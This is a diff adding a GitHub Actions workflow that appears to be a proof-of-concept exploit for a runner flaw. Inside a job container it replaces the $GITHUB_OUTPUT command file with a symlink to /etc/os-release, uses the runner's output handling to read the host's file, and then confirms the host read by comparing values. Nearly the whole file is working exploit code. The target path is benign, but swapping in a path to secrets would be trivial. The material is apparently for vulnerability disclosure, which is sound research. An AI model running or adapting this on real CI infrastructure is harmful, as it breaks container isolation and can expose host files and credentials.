@@ -1,0 +1,61 @@
+name: runner-filecommand-symlink-poc
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+
+    container:
+      image: alpine:3.22
+
+    steps:
+      - name: Show container identity
+        id: container
+        shell: sh
+        run: |
+          echo "=== CONTAINER /etc/os-release ==="
+          cat /etc/os-release
+
+          . /etc/os-release
+          echo "container_pretty=$PRETTY_NAME" >> "$GITHUB_OUTPUT"
+
+      - name: Replace GITHUB_OUTPUT with host-targeting symlink
+        id: hijack
+        shell: sh
+        run: |
+          echo "Original command file:"
+          ls -l "$GITHUB_OUTPUT"
+
+          rm -f "$GITHUB_OUTPUT"
+          ln -s /etc/os-release "$GITHUB_OUTPUT"
+
+          echo "Replaced command file:"
+          ls -l "$GITHUB_OUTPUT"
+
+          echo "Container resolves symlink as:"
+          cat "$GITHUB_OUTPUT"
+
+      - name: Verify host file read
+        shell: sh
+        env:
+          CONTAINER_PRETTY: ${{ steps.container.outputs.container_pretty }}
+          HOST_PRETTY: ${{ steps.hijack.outputs.PRETTY_NAME }}
+          HOST_ID: ${{ steps.hijack.outputs.ID }}
+          HOST_VERSION: ${{ steps.hijack.outputs.VERSION_ID }}
+        run: |
+          echo "=== comparison ==="
+          echo "CONTAINER_PRETTY=$CONTAINER_PRETTY"
+          echo "HOST_PRETTY=$HOST_PRETTY"
+          echo "HOST_ID=$HOST_ID"
+          echo "HOST_VERSION=$HOST_VERSION"
+
+          if [ -n "$HOST_PRETTY" ] && [ "$HOST_PRETTY" != "$CONTAINER_PRETTY" ]; then
+            echo "HOST_FILE_READ_CONFIRMED=true"
+          else
+            echo "HOST_FILE_READ_CONFIRMED=false"
+          fi
